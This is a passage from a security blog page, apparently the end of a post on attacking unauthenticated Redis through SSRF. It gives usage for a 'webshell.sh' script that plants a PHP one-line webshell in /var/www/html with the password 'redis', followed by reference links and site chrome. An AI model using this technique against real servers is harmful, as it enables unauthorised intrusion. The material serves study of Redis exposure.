+<h3 id="webshell-sh"><a href="#webshell-sh" class="headerlink" title="webshell.sh"></a>webshell.sh</h3><p>用法</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./webshell.sh <span class="comment">[redis-ip]</span> <span class="comment">[redis端口]</span></span><br></pre></td></tr></table></figure>
+<p>会在<code>/var/www/html</code>目录下生成shell.php一句话，默认密码redis</p>
+<h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><p>由于<code>flushall</code>破坏性太大，没写入脚本中。</p>
+<p>在原先存在一些数据的时候会影响成功率，需要的话可以自行添加</p>
+<h1 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h1><p><a href="http://p0sec.net/index.php/archives/69/" target="_blank" rel="noopener">http://p0sec.net/index.php/archives/69/</a></p>
+<p><a href="https://xz.aliyun.com/t/1800#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800#toc-2</a></p>
+<p><a href="https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341" target="_blank" rel="noopener">https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341</a></p>
+<p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/08/xss练习记录/" data-toggle="tooltip" data-placement="top" title="xss练习记录">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/08/Flask-debug-pin安全问题/" data-toggle="tooltip" data-placement="top" title="Flask debug pin安全问题">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#redis" title="redis">redis</a>
+                        
+                          <a class="tag" href="/tags/#ssrf" title="ssrf">ssrf</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
